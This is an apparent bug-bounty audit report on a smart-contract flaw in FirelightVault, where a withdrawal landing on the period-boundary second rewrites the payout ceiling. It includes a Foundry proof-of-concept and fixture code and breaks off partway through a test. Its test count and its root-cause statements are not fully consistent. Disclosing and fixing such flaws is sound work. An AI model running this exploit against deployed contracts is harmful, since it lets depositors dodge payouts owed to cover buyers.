# 88308 sc high totalassetsat resolves a period s opening assets inclusively so a withdrawal in the boundary second redefines the ceiling on every claim against that period

**Submitted on Aug 12th 2026 at 17:36:09 UTC by @ret2basic for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88308
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Two decisions depend on one number: how much cover a period may sell (`CoverOrderAllocator._computeAvailableCapacity`) and the ceiling on what that period may pay out (`FirelightVault.payout`). Both read `totalAssetsAt(periodStart)`. That is not a snapshot taken at the boundary — it resolves to the most recent `_traceTotalAssets` checkpoint whose key is **less than or equal to** `periodStart`. The bound is inclusive, so the figure a period opens with is not frozen when the period begins: it still counts anything written during the boundary second itself. A withdrawal executed in that second therefore redefines the period's own opening number after the period has already started. The assets do not leave the vault: they move into `withdrawAssets[period + 1]`, which `payout` explicitly still counts as payable. The result is a state where the collateral is present, marked payable, and the ceiling that decides what claims are worth reads zero.

## Vulnerability Details

The read is inclusive of the boundary key:

```solidity
    function totalAssetsAt(uint48 timestamp) public view returns (uint256) {
        return _traceTotalAssets.upperLookupRecent(timestamp);
    }
```

```solidity
     * @dev Returns the value in the last (most recent) checkpoint with a key lower or equal than the search key, 
     * or zero if there is none.
     */
    function upperLookupRecent(Trace256 storage self, uint48 key) internal view returns (uint256) {
```

A write whose key is exactly `periodStart` is therefore inside the window that `totalAssetsAt(periodStart)` answers from. Which branch of `push` performs that write does not change the outcome, and **the PoC measures which one runs** rather than assuming: `test_whichCheckpointBranchTheBoundarySecondActuallyTakes` shows `totalAssetsAt(boundary) == totalAssetsAt(boundary - 1)` before the withdrawal, proving no checkpoint sat on the boundary key, so the boundary-second write **appends**. The reading still changes from 1,000,000e6 to 0.

The equal-key branch below is a second route to the same outcome, reached whenever a checkpoint already occupies that key — for instance when `VaultRewardDistributor` forwards assets and calls `checkpointTotalAssets()` in the boundary second, or when two vault operations share it:

```solidity
function push(Trace256 storage self, uint48 key, uint256 value) internal returns (uint256, uint256) {
    if (self._values.length == 0) {
        self._values.push(0);
    }
    (bool exists, uint48 lastKey,) = self._trace.latestCheckpoint();
    uint256 len = self._values.length;
    uint256 lastValue = latest(self);
    if (exists && key == lastKey) {
        self._values[len - 1] = value;      // <-- annotation: same key, the old value is gone
    } else {
        self._trace.push(key, uint208(len));
        self._values.push(value);
    }
    return (lastValue, value);
}
```

Every vault flow pushes at the current second:

```solidity
function _logTrace(
    address owner,
    uint256 balance,
    uint256 _totalSupply,
    uint256 _totalAssets,
    bool isLogAssets
) private {
    uint48 ts = Time.timestamp();
    _traceBalanceOf[owner].push(ts, balance);
    _traceTotalSupply.push(ts, _totalSupply);

    if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
}
```

and a period boundary is an ordinary second: `currentPeriodStart()` returns `epoch + k * duration`, and a transaction can land in the block carrying exactly that timestamp. When it does, `_traceTotalAssets` already holds a checkpoint on that key only if something else touched the vault in the same second; otherwise the push appends a *new* checkpoint whose key equals `periodStart`. Either way `upperLookupRecent(periodStart)` now returns the post-withdrawal value, because it selects the greatest key **less than or equal to** the search key.

The withdrawal itself is period-correct in every other respect. At `block.timestamp == periodStart` the vault is in period `p`, so `_requestWithdraw` files the assets under `currentPeriod() + 1 == p + 1`:

```solidity
uint256 period = currentPeriod() + 1;
uint256 sharesWithdraw = _convertToSharesTotals(
    assets,
    withdrawShares[period],
    withdrawAssets[period],
    Math.Rounding.Floor
);
withdrawAssets[period] += assets;
withdrawShares[period] += sharesWithdraw;
withdrawSharesOf[period][receiver] += sharesWithdraw;

pendingWithdrawAssets += assets;
```

and `payout` treats exactly that bucket as still exposed to a period-`p` incident:

```solidity
// Withdrawals requested during the capture period are assigned to capturePeriod + 1
// and remain payable while payout is allowed.
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];
...
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

So the two halves of the same statement disagree: `activePayableAmount` counts the withdrawn assets, and `assetsAtCapturePeriod` — now rewritten — does not. `Math.min` takes the smaller, and the claim collapses to whatever the ceiling was rewritten to.

Contrast the same withdrawal one second **earlier**, in period `p - 1`: the assets are filed under bucket `p`, which `payout` does *not* count as payable for a period-`p` incident, and the reduced snapshot is then correct. The accounting is coherent at `periodStart - 1` and incoherent at `periodStart`. The PoC's control test isolates this to exactly that one second.

The project's own suite states the intended property directly. In `test/vault_payout.js`, `"caps payout to assets at the capture period start"` deposits 2, crosses into the next period, deposits a further 5 mid-period, and asserts that a payout of 7 delivers only **2**:

```javascript
const captureTimestamp = await firelight_vault.currentPeriodStart();
await firelight_vault.connect(users[0]).deposit(5n, users[0].address);
expect(await firelight_vault.totalAssets()).to.equal(7n);

await expect(firelight_vault.connect(payout_signer).payout(payout_receiver.address, 7n, captureTimestamp))
  .to.emit(firelight_vault, "PayoutExecuted")
  .withArgs(payout_receiver.address, 7n, 2n, captureTimestamp);
```

The ceiling is expected to ignore anything that happens after the period opens — that is the whole point of the test, and it passes. What is not covered is that the same figure can still be *rewritten*, by a write landing on the boundary key itself. The suite verifies the ceiling holds against later deposits; it does not verify that the ceiling is immutable.

That boundary-second writes are meaningful is not an accident of this report — the protocol depends on it. `VaultRewardDistributor` forwards assets and then calls `checkpointTotalAssets()` precisely so that "historical `totalAssetsAt` lookups (period-start snapshots) include the forwarded assets". A reward landing on the boundary second correctly *raises* the period's opening figure. The same mechanism, driven by a withdrawal, incorrectly *lowers* it. The write path is identical; only the direction and the caller differ, and nothing distinguishes them.

Ordering inside the boundary block decides which of two harms lands:

* **Commit first, withdrawal second** — the matcher commits against the intact figure and cover is sold and settled, then the ceiling is rewritten. Claims on that cover are capped by the rewritten value. This is the case the PoC measures.
* **Withdrawal first, commit second** — `_computeAvailableCapacity` reads the rewritten figure and the period's matched tree can no longer be committed, so the period sells no cover at all.

## Impact Details

### How far it scales

The ceiling falls by exactly what the caller withdraws, so the shortfall is the size of their own position rather than the size of the vault. Measured with a holder of 10% of a 1,000,000 fXRP vault:

```
ceiling before         (6dp): 1000000000000
ceiling after          (6dp):  900000000000
still payable          (6dp): 1000000000000
collateral unreachable (6dp):  100000000000
```

Every token remains in the vault and in the bucket `payout` treats as exposed; 100,000 fXRP of it simply cannot be reached by any claim against that period. The "pays zero" case in the table below is the limit of the same behaviour, where the withdrawing holder is the whole of the active pool. On the live vault (58,288,993 fXRP at block `0x4021533`) a holder of a tenth of it would put roughly 5.8M fXRP — about $11.6M at the feed price — beyond reach of that period's claims while leaving it in the contract.

### The full-holder case, end to end

The PoC measures it with the real vault, allocator, cover NFT and incident manager:

| Quantity                                         | Value                         |
| ------------------------------------------------ | ----------------------------- |
| Capacity committed for the period                | 100,000 canonical USD         |
| Cover sold and settled                           | 100,000 canonical USD         |
| Loss assessed on a genuine incident              | 100,000 canonical USD         |
| **Paid to the payout recipient**                 | **0**                         |
| Tokens held by the vault throughout              | 1,000,000 fXRP (≈ $2,000,000) |
| Of which marked payable in `withdrawAssets[p+1]` | 1,000,000 fXRP                |

The control test runs the identical sequence with the withdrawal one second later and the same claim pays **50,000 fXRP in full**. The only variable is the second in which one ordinary `withdraw` call executes.

### The caller gains; this is not griefing

The same holder, in two runs identical but for the second their withdrawal lands in, ends with materially different money. Cover of 400,000 USD is sold and settled, the holder exits, and a claim for the full amount is approved:

| exit lands                    | holder's claimable position afterwards |
| ----------------------------- | -------------------------------------- |
| one second after the boundary | 800,000 fXRP                           |
| **on the boundary second**    | **1,000,000 fXRP**                     |
|                               | **gain: 200,000 fXRP**                 |

The mechanism is direct. Exiting one second late leaves the ceiling intact, the claim is paid, and because the holder's capital sits in the bucket `payout` treats as still exposed, the payment is drawn from them — they bear the loss their capital was underwriting, which is the design. Exiting on the boundary second rewrites the ceiling to the post-exit figure, `paidAmount` collapses to `min(amount, ceiling, payable)`, and their bucket is never touched. The gain is exactly the payout they escaped.

Who is harmed and who acts:

* **Cover buyers** lose the claim on cover they paid a premium for.
* **The actor** is any depositor calling `withdraw` — no role, no special capability, no capital beyond the position they already hold — and they keep money they would otherwise have paid.
* Other depositors who did not use the timing are left carrying whatever the reduced claim still draws.

A note on how easily this happens by accident. While writing an unrelated test — one exercising the payout arm that draws on a second withdrawal bucket — the sequence happened to place a withdrawal on the boundary second, and the claim paid 10,000 fXRP instead of the expected 50,000. Nothing in the protocol's state explains that gap; it took recognising this finding to know why the number was wrong. The test now warps one second past the boundary specifically to avoid it.

Honest scoping of the constraint: the transaction must land in the block whose timestamp is exactly `epoch + k * duration`. A caller cannot choose a block timestamp. On Flare, blocks arrive roughly every 1.8 seconds, so a given second is carried by a block a large fraction of the time, and an actor can retry at every boundary — daily or weekly — at the cost of one transaction. It can also occur with no intent at all, from an ordinary user who happens to withdraw at the wrong second, in which case the period's claims quietly become unpayable with nothing in the protocol's own state to explain why.

### Why the program's out-of-scope rules do not exclude this

No privileged actor appears anywhere in the PoC: the attacker is an ordinary depositor calling `withdraw` on their own position, so the exclusion for trusted roles acting incorrectly does not apply. Nor is this a "basic economic attack" — no market, price, or liquidity is manipulated; a single ordinary call rewrites a stored accounting checkpoint.

**Why griefing is not the right impact here.** The in-scope griefing entry is defined as "no profit motive for an attacker". That was measured and refuted: the same holder, running the identical sequence and differing only in the second their exit lands, ends **200,000 fXRP** better off. The gain is the payout they escaped, and it is exactly the cover buyer's loss.

**What limits it, stated plainly.** The withdrawal must land in a block whose `block.timestamp` equals the period boundary, and a caller cannot choose a block timestamp — so the attack is opportunistic rather than on-demand. Nothing else is required: no role, no capital beyond the position already held, one ordinary call, and the boundary recurs every period.

### The defect is in the shared library, not in one call site

`_traceTotalAssets` is not the only trace built on this `push`. The vault keeps a per-account checkpoint with the same library and the same key:

```solidity
_traceBalanceOf[sender].push(ts, balanceOf(sender));
_traceBalanceOf[to].push(ts, balanceOf(to));
```

and exposes it through the in-scope interface:

```solidity
function balanceOfAt(address account, uint48 timestamp) external view returns (uint256) {
    return _traceBalanceOf[account].upperLookupRecent(timestamp);
}
```

A transfer landing on a period boundary rewrites that account's start-of-period balance in exactly the same way. This report does **not** claim a separate impact for it: no in-scope contract reads `balanceOfAt`, so today the consequence falls only on off-chain consumers of a documented public view. It is raised because it decides the shape of the fix. Patching `payout` or `_computeAvailableCapacity` to compensate would leave the second surface intact and would break again the moment a future contract reads `balanceOfAt` at a boundary. The fix belongs in the checkpoint library or at every push site, not at the readers.

## Recommended fix

Read the period's opening state from a key that no in-period transaction can write. Checkpoint keys are monotonic, so any key strictly below the boundary is final once the period starts:

```solidity
// FirelightVault.payout
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart - 1);
```

and the matching change in `CoverOrderAllocator._computeAvailableCapacity`:

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart() - 1),
    $.vaultAssetDecimals, CANONICAL_DECIMALS, Math.Rounding.Floor
);
```

This makes both readers ask "what did this period open with", which is the question they mean, instead of "what does the boundary key hold now", which is mutable for one second. Both call sites must change together, or capacity and the payout ceiling will be measured against different instants.

An alternative is to have `payout` bound the claim by `max(assetsAtCapturePeriod, capturePeriodWithdrawals + nextPeriodWithdrawals)`, which restores coherence between the two halves of `Math.min`, but it does not fix the capacity side.

## References

* `contracts/core/lib/Checkpoints.sol` — `upperLookupRecent` (inclusive bound; the primary mechanism), `Trace256.push` (equal-key overwrite; the secondary route)
* `contracts/core/FirelightVault.sol` — `payout`, `_logTrace`, `_requestWithdraw`, `currentPeriodStart`
* `contracts/core/CoverOrderAllocator.sol` — `_computeAvailableCapacity`, `commitAllocation`
* Repository: `https://github.com/immunefi-team/audit-comp-firelight` @ `42f9ea5e43d88b35197b901acc2a8c24b314fa62`

## Proof of Concept

## Proof of Concept

### Prerequisites

* **Toolchain:** `forge 1.7.1` (Foundry), `solc 0.8.28`, Node.js with `npm`.
* **No RPC required.** The PoC runs entirely on a local EVM. No environment variables, credentials, or forked state are used.
* **Target:** `https://github.com/immunefi-team/audit-comp-firelight`, branch `v1_audit_ready`, commit `42f9ea5e43d88b35197b901acc2a8c24b314fa62`.
* **Contracts under test:** the real `FirelightVault`, `CoverOrderAllocator`, `CoverNFT` and `IncidentManager` from `contracts/core/`, each behind a real `ERC1967Proxy`, initialized through their production `initialize` functions.

### Attacker capabilities

One ordinary vault shareholder, holding only the position they deposited:

* `lp` calls `withdraw(...)` once. No role, no allowance from anyone else, no flash loan, no capital that did not arrive through `deposit()`.
* The only environmental assumption is **transaction timing**: the withdrawal executes in the block whose timestamp equals the period boundary, and after the allocator's commit in that block. A caller cannot choose a block timestamp; on Flare, where blocks arrive roughly every 1.8 seconds, an actor retries at each boundary. `vm.warp` is used to place the test on that second — it stands in for the timing, not for any capability the caller lacks.

Everything else is a legitimate role doing its job: `curator` sells cover and reports the incident, `allocatorRole` commits and settles, `admin` approves.

No `vm.store`, no `vm.etch`, no impersonation of a role to defeat a check.

### Environmental doubles, disclosed

* `MockERC20` as the vault asset (6 decimals, matching the live FXRP) and as the premium / first-loss-buffer token — the project's own test doubles.
* `MockAggregatorV3` as the price feed, held at a constant $2.00. The finding does not involve the oracle; a constant feed keeps the arithmetic legible.
* The first-loss buffer is left unfunded so the whole assessed loss routes to the vault, which is the leg the ceiling applies to.

### Production layers this PoC does not execute

* The off-chain matching engine; the Merkle commitment is a single-leaf tree the allocator accepts.
* The real FTSO oracle, the real FXRP token, and production deployment scripts.
* Block production: `vm.warp` places the test on the boundary second deterministically, where a real actor would be relying on inclusion in that block.

### Reproduction steps

1. Clone the target at the pinned commit and install its dependencies:

   ```bash
   git clone https://github.com/immunefi-team/audit-comp-firelight
   cd audit-comp-firelight
   git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62
   npm ci                      # runs patch-package, which restores OpenZeppelin's SafeMath.sol
   git clone --depth 1 https://github.com/foundry-rs/forge-std node_modules/forge-std
   ```
2. Copy every file below into the matching path.
3. Run:

   ```bash
   forge test --match-contract BoundarySnapshotTest -vv
   ```
4. Expected output:

   ```
   Ran 6 tests for fuzz/BoundarySnapshot.t.sol:BoundarySnapshotTest
   [PASS] test_aWithdrawalAtTheBoundarySecondRewritesTheSnapshot()
   Logs:
     tokens held by the vault       (6dp): 1000000000000
     payable bucket for this period (6dp): 1000000000000
     totalAssetsAt(periodStart)     (6dp): 0

   [PASS] test_oneSecondLaterTheSameWithdrawalIsHarmless()
   Logs:
     control: paid to recipient (6dp): 50000000000

   [PASS] test_soldCoverBecomesUnpayableWhileTheCollateralIsStillThere()
   Logs:
     committed capacity   (canonical USD): 100000000000000000000000
     assessed loss        (canonical USD): 100000000000000000000000
     paid to recipient              (6dp): 0
     vault tokens held              (6dp): 1000000000000
     payable bucket                 (6dp): 1000000000000

   [PASS] test_theSameSecondAlsoCollapsesTheCapacityTheMatcherMayCommit()
   Logs:
     collateral held by the vault (6dp): 1000000000000
     cover the period could commit    : 0
   ```

### What each test establishes

* **`test_aWithdrawalAtTheBoundarySecondRewritesTheSnapshot`** — the mechanism in isolation. The period opens with `totalAssetsAt(periodStart) == 1,000,000e6` (asserted). One `withdraw` at that same second later, the vault still holds every token and the assets sit in `withdrawAssets[period + 1]` — the bucket `payout` counts as payable — yet `totalAssetsAt(periodStart)` now reads **0**.
* **`test_soldCoverBecomesUnpayableWhileTheCollateralIsStillThere`** — the target behaviour end to end. Capacity is committed against the intact figure, 100,000 USD of cover is sold and settled, the withdrawal then rewrites the ceiling, and a genuine incident assessed at the full cover amount pays **0**. The measured victim delta is the cover buyer's entire claim, against a vault that holds 1,000,000 fXRP throughout and marks all of it payable.
* **`test_theSameSecondAlsoCollapsesTheCapacityTheMatcherMayCommit`** — the other half of the same defect, at the second on-chain call site. With the withdrawal landing *before* the commit in the boundary block, `CoverOrderAllocator._computeAvailableCapacity` reads the rewritten figure and `commitAllocation` reverts: the period sells no cover at all, while the vault holds the full 1,000,000 fXRP that would have backed it.
* **`test_aPartialHolderShrinksTheCeilingByTheirOwnStake`** — how far it scales. A holder of 10% of the vault withdraws at the boundary second: the ceiling falls by exactly their 10%, all 1,000,000 fXRP remains in the vault and in the payable bucket, and 100,000 fXRP of present, exposed collateral becomes unreachable by any claim against that period. The zero-payout case above is the limit of the same behaviour, not a separate one.
* **`test_whichCheckpointBranchTheBoundarySecondActuallyTakes`** — written during a false-positive review of this finding, to decide by observation which branch of `Checkpoints.push` the boundary-second write actually takes. It shows `totalAssetsAt(boundary) == totalAssetsAt(boundary - 1)` *before* the withdrawal, which proves no checkpoint occupied the boundary key, so the write **appends** rather than overwrites — and the reading still falls from 1,000,000e6 to 0. The defect is therefore the inclusive `<= key` bound in `upperLookupRecent`, not the equal-key overwrite; the overwrite is a second route to the same outcome. This test exists so the report's root cause matches the branch the PoC executes.
* **`test_theWithdrawingHolderEndsRicherForHavingUsedTheBoundary`** — whether the caller gains, which decides whether this is griefing or an attack. The whole sequence is run twice, identical but for the second the withdrawal lands in. Exiting one second late leaves the holder with 800,000 fXRP claimable; exiting on the boundary second leaves them with 1,000,000 — **200,000 fXRP kept**, exactly the payout they escaped, while the cover buyer receives nothing.
* **`test_oneSecondLaterTheSameWithdrawalIsHarmless`** — the same-input control. Every step is identical except that the withdrawal executes at `periodStart + 1`. The snapshot survives (asserted) and the identical claim pays **50,000e6 fXRP in full**. One second of difference separates a full payout from a zero payout, which isolates the equal-key overwrite as the cause and rules out every other explanation.

### Complete runnable PoC files

#### `poc-inputs/foundry.toml`

```toml
[profile.default]
src = "contracts"
test = "fuzz"
out = "forge-out"
cache_path = "forge-cache"
libs = ["node_modules"]
# Vendored Flare FAsset sources pin =0.8.23 and are out of the audit scope.
skip = ["contracts/fasset/**"]
solc = "0.8.28"
evm_version = "london"
via_ir = true
optimizer = true
optimizer_runs = 200
remappings = [
  "@openzeppelin/contracts/=node_modules/@openzeppelin/contracts/",
  "@openzeppelin/contracts-upgradeable/=node_modules/@openzeppelin/contracts-upgradeable/",
  "flare-smart-contracts/=node_modules/flare-smart-contracts/",
  "flare-smart-contracts-v2/=node_modules/flare-smart-contracts-v2/",
  "forge-std/=node_modules/forge-std/src/",
]

[invariant]
runs = 400
depth = 200
fail_on_revert = false
```

#### `poc-inputs/fuzz/FullChainFixture.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {FirelightVault} from "../contracts/core/FirelightVault.sol";
import {CoverOrderAllocator} from "../contracts/core/CoverOrderAllocator.sol";
import {CoverNFT} from "../contracts/core/CoverNFT.sol";
import {IncidentManager} from "../contracts/core/IncidentManager.sol";
import {ICoverOrderAllocator} from "../contracts/core/interfaces/ICoverOrderAllocator.sol";
import {IIncidentManager} from "../contracts/core/interfaces/IIncidentManager.sol";
import {IFirelightVault} from "../contracts/core/interfaces/IFirelightVault.sol";
import {IAggregatorV3} from "../contracts/core/interfaces/IAggregatorV3.sol";
import {MockERC20} from "../contracts/test/MockERC20.sol";
import {MockAggregatorV3} from "../contracts/test/MockAggregatorV3.sol";

/// @dev The real FirelightVault / CoverOrderAllocator / CoverNFT / IncidentManager
///      wired together the way production does. The project's own suites substitute
///      a mock vault into both the allocator and the incident tests, so this is the
///      only place the four meet.
abstract contract FullChainFixture is Test {
    uint48 internal constant PERIOD = 7 days;

    MockERC20 internal fxrp; // vault asset, 6 dp
    MockERC20 internal usdc; // premium + first-loss-buffer token, 6 dp
    MockAggregatorV3 internal feed; // asset/USD, 18 dp

    FirelightVault internal vault;
    CoverOrderAllocator internal allocator;
    CoverNFT internal coverNFT;
    IncidentManager internal incidents;

    address internal admin = address(0xA0);
    address internal curator = address(0xC0);
    address internal allocatorRole = address(0xA1);
    address internal flbWallet = address(0xFB);
    address internal buyer = address(0xB1);
    address internal payoutRecipient = address(0xB2);
    address internal payoutReceiver = address(0xB3);
    address internal lp = address(0x11);

    bytes32 internal marketId;
    uint256 internal refNonce;

    function _deployFullChain() internal {
        vm.warp(1_800_000_000);
        fxrp = new MockERC20("fXRP", "fXRP", 6);
        usdc = new MockERC20("USDC", "USDC", 6);
        feed = new MockAggregatorV3(18, 2e18);

        FirelightVault vImpl = new FirelightVault();
        FirelightVault.InitParams memory p = FirelightVault.InitParams({
            defaultAdmin: admin,
            limitUpdater: admin,
            blocklister: admin,
            pauser: admin,
            periodConfigurationUpdater: admin,
            rescuer: admin,
            depositLimit: 100_000_000e6,
            periodConfigurationDuration: PERIOD
        });
        vault = FirelightVault(
            address(
                new ERC1967Proxy(
                    address(vImpl),
                    abi.encodeCall(
                        FirelightVault.initialize,
                        (IERC20(address(fxrp)), "stfXRP", "stfXRP", abi.encode(p))
                    )
                )
            )
        );

        CoverNFT nImpl = new CoverNFT();
        coverNFT = CoverNFT(
            address(
                new ERC1967Proxy(
                    address(nImpl),
                    abi.encodeCall(
                        CoverNFT.initialize,
                        ("Firelight Cover", "FLC", "", admin, address(0), address(0), address(0))
                    )
                )
            )
        );

        address[] memory premiumTokens = new address[](1);
        premiumTokens[0] = address(usdc);
        ICoverOrderAllocator.ProtocolConcentrationInput[] memory conc =
            new ICoverOrderAllocator.ProtocolConcentrationInput[](1);
        conc[0] = ICoverOrderAllocator.ProtocolConcentrationInput({
            chainId: 1, protocol: "Morpho", maxProtocolConcentrationBps: 10_000
        });
        ICoverOrderAllocator.Market[] memory markets = new ICoverOrderAllocator.Market[](1);
        markets[0] = ICoverOrderAllocator.Market({chainId: 1, protocol: "Morpho", market: bytes32("market-A")});
        marketId = keccak256(abi.encode(uint64(1), string("Morpho"), bytes32("market-A")));

        CoverOrderAllocator aImpl = new CoverOrderAllocator();
        allocator = CoverOrderAllocator(
            address(
                new ERC1967Proxy(
                    address(aImpl),
                    abi.encodeCall(
                        CoverOrderAllocator.initialize,
                        (
                            ICoverOrderAllocator.InitParams({
                                vault: IFirelightVault(address(vault)),
                                premiumCollector: address(0xC01),
                                coverNFT: coverNFT,
                                priceFeedAdapter: IAggregatorV3(address(feed)),
                                maxPriceAge: 7 days,
                                premiumTokens: premiumTokens,
                                admin: admin,
                                adminRole: admin,
                                curatorRole: curator,
                                allocatorRole: allocatorRole,
                                configAdminRole: admin,
                                initialProtocolConcentrations: conc,
                                newMarkets: markets,
                                capacityConfig: ICoverOrderAllocator.CapacityConfig({
                                    minCAR: 12_000,
                                    firstLossBufferToken: IERC20(address(usdc)),
                                    firstLossBuffer: flbWallet,
                                    effectiveLeverage: 24_000,
                                    minOrderMarketCoverAmount: 1,
                                    divergenceToleranceBps: 0
                                })
                            })
                        )
                    )
                )
            )
        );

        IncidentManager iImpl = new IncidentManager();
        incidents = IncidentManager(
            address(
                new ERC1967Proxy(
                    address(iImpl),
                    abi.encodeCall(
                        IncidentManager.initialize,
                        (
                            admin, curator, admin, admin, admin, admin, admin, admin,
                            payoutReceiver,
                            ICoverOrderAllocator(address(allocator)),
                            IAggregatorV3(address(feed)),
                            uint48(7 days)
                        )
                    )
                )
            )
        );

        vm.startPrank(admin);
        coverNFT.grantRole(coverNFT.MINTER_ROLE(), address(allocator));
        vault.grantRole(vault.PAYOUT_ROLE(), address(incidents));
        vault.grantRole(vault.INCIDENT_ROLE(), address(incidents));
        vault.grantRole(vault.PAYOUT_ALLOWLIST_ROLE(), admin);
        vault.addToPayoutAllowlist(payoutReceiver);
        vm.stopPrank();
    }

    function _lpDeposit(uint256 amount6) internal {
        fxrp.mint(lp, amount6);
        vm.startPrank(lp);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(amount6, lp);
        vm.stopPrank();
    }

    /// @dev Creates, commits and settles one cover order, returning it and the
    ///      period it covers. The order is raised in the period before the covered
    ///      one, exactly as production does.
    function _sellCover(uint256 coverUsd) internal returns (uint256 orderId, uint256 coveredPeriod) {
        ICoverOrderAllocator.MarketAllocationInput[] memory mas =
            new ICoverOrderAllocator.MarketAllocationInput[](1);
        mas[0] = ICoverOrderAllocator.MarketAllocationInput({
            marketId: marketId, coverRateAnnual: 500, coverAmount: coverUsd
        });
        vm.prank(curator);
        orderId = allocator.createCoverOrder(
            buyer, payoutRecipient, "rAddr", address(usdc), mas, ICoverOrderAllocator.CoverOrderType.NEW
        );

        vm.warp(vault.currentPeriodEnd());
        feed.setAnswer(2e18);
        coveredPeriod = vault.currentPeriod();

        usdc.mint(buyer, 1_000_000e6);
        vm.prank(buyer);
        usdc.approve(address(allocator), type(uint256).max);
        vm.prank(flbWallet);
        usdc.approve(address(incidents), type(uint256).max);

        ICoverOrderAllocator.MarketCoverAllocation[] memory mcas =
            new ICoverOrderAllocator.MarketCoverAllocation[](1);
        mcas[0] = ICoverOrderAllocator.MarketCoverAllocation({marketId: marketId, allocatedCover: coverUsd});
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(orderId, mcas))));

        vm.prank(allocatorRole);
        allocator.commitAllocation(coveredPeriod, leaf, coverUsd, coverUsd);
        vm.prank(allocatorRole);
        allocator.settleCoverOrder(orderId, mcas, new bytes32[](0));
    }

    /// @dev Raises an incident on the settled order and drives it to the point
    ///      where only approval (and therefore payout) remains.
    function _openAndSubmitAssessment(uint256 orderId, uint256 lossUsd)
        internal
        returns (uint256 incidentId)
    {
        refNonce++;
        vm.prank(curator);
        incidentId =
            incidents.createIncident(uint48(block.timestamp), "hack", keccak256(abi.encode("ref", refNonce)));
        vm.prank(curator);
        incidents.confirmIncident(incidentId, "ipfs://report");

        IIncidentManager.AssessmentLoss[] memory losses = new IIncidentManager.AssessmentLoss[](1);
        losses[0] =
            IIncidentManager.AssessmentLoss({coverTokenId: orderId, marketId: marketId, amount: lossUsd});
        vm.prank(curator);
        incidents.addAssessmentLosses(incidentId, losses);
        vm.prank(curator);
        incidents.submitCurrentAssessment(incidentId);
    }
}
```

#### `poc-inputs/fuzz/BoundarySnapshot.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {IIncidentManager} from "../contracts/core/interfaces/IIncidentManager.sol";
import {ICoverOrderAllocator} from "../contracts/core/interfaces/ICoverOrderAllocator.sol";
import {FullChainFixture} from "./FullChainFixture.sol";

/// @dev Both the capacity a period may sell and the ceiling on what it may pay
///      are read from one number: `totalAssetsAt(periodStart)`. That number is
///      not a snapshot the vault takes at the boundary -- it is whatever the last
///      `_traceTotalAssets` checkpoint at or before `periodStart` happens to hold,
///      and `Checkpoints.push` OVERWRITES the value when the key is unchanged.
///
///      A withdrawal executed in the same second as the boundary therefore
///      rewrites the period's own start-of-period figure after the fact. The
///      assets do not leave: they move into `withdrawAssets[period + 1]`, which
///      `payout` explicitly still counts as payable. So the collateral is present
///      and exposed, and the ceiling that decides what claims are worth no longer
///      knows about it.
contract BoundarySnapshotTest is FullChainFixture {
    function setUp() public {
        _deployFullChain();
    }

    /// The mechanism on its own: one withdrawal, executed at the boundary second,
    /// rewrites the period-start figure that was already true before it.
    function test_aWithdrawalAtTheBoundarySecondRewritesTheSnapshot() public {
        _lpDeposit(1_000_000e6);

        // Land exactly on the boundary. `currentPeriodEnd()` of the old period is
        // `currentPeriodStart()` of the new one, to the second.
        vm.warp(vault.currentPeriodEnd());
        feed.setAnswer(2e18);
        uint48 periodStart = vault.currentPeriodStart();
        assertEq(uint256(periodStart), block.timestamp, "standing on the boundary");
        assertEq(vault.totalAssetsAt(periodStart), 1_000_000e6, "the period opened fully funded");

        // The holder exits. Their assets stay in the vault, earmarked to a bucket
        // that `payout` still treats as payable for this very period.
        // Hoisted: an external call in the argument list consumes the pending prank.
        uint256 exitAmount = vault.maxWithdraw(lp);
        vm.prank(lp);
        vault.withdraw(exitAmount, lp, lp);

        uint256 period = vault.currentPeriod();
        assertEq(vault.withdrawAssets(period + 1), 1_000_000e6, "assets are in the payable bucket");
        assertEq(fxrp.balanceOf(address(vault)), 1_000_000e6, "the vault still holds every token");

        // The start-of-period figure has been rewritten to the post-withdrawal
        // value, on the same key, after the period had already begun.
        assertEq(vault.totalAssetsAt(periodStart), 0, "the period-start snapshot was erased");

        console.log("tokens held by the vault       (6dp):", fxrp.balanceOf(address(vault)));
        console.log("payable bucket for this period (6dp):", vault.withdrawAssets(period + 1));
        console.log("totalAssetsAt(periodStart)     (6dp):", vault.totalAssetsAt(periodStart));
    }

    /// The consequence: cover is sold against the figure as it stood, the figure is
    /// then rewritten in the same block, and the claim is capped by the rewritten
    /// value while the collateral backing it is still sitting in the vault.
    function test_soldCoverBecomesUnpayableWhileTheCollateralIsStillThere() public {
        _lpDeposit(1_000_000e6); // 1,000,000 fXRP = $2,000,000 at the feed price

        // Raise the order in the period before the one it covers.
        ICoverOrderAllocator.MarketAllocationInput[] memory mas =
            new ICoverOrderAllocator.MarketAllocationInput[](1);
        mas[0] = ICoverOrderAllocator.MarketAllocationInput({
            marketId: marketId, coverRateAnnual: 500, coverAmount: 100_000e18
        });
        vm.prank(curator);
        uint256 orderId = allocator.createCoverOrder(
            buyer, payoutRecipient, "r", address(usdc), mas, ICoverOrderAllocator.CoverOrderType.NEW
        );

        // Step onto the boundary of the covered period.
        vm.warp(vault.currentPeriodEnd());
        feed.setAnswer(2e18);
        uint48 periodStart = vault.currentPeriodStart();
        uint256 coveredPeriod = vault.currentPeriod();

